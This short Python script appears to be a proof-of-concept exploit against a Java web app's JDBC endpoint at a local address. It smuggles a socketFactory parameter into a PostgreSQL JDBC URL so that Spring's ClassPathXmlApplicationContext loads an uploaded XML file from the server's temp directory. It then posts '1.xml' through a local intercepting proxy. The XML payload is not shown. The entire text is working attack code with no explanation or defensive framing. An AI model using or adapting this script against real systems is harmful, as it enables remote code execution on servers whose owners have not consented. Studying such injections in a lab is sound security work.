import requests
from urllib import parse

url1 = parse.quote("jdbc:postgresql://localhost:5432/test?a=")
url2 = parse.quote("&socketFactory=org.springframework.context.support.ClassPathXmlApplicationContext&socketFactoryArg=file:///${catalina.home}/**/*.tmp")

url = f"http://127.0.0.1:8081/jdbc?url={url1}&url={url2}"
print(url)


file = {"file": open("1.xml", "rb")}

proxy = {
    "http": "http://127.0.0.1:8080",
    "https": "http://127.0.0.1:8080"
}

response = requests.post(url, files=file, proxies=proxy)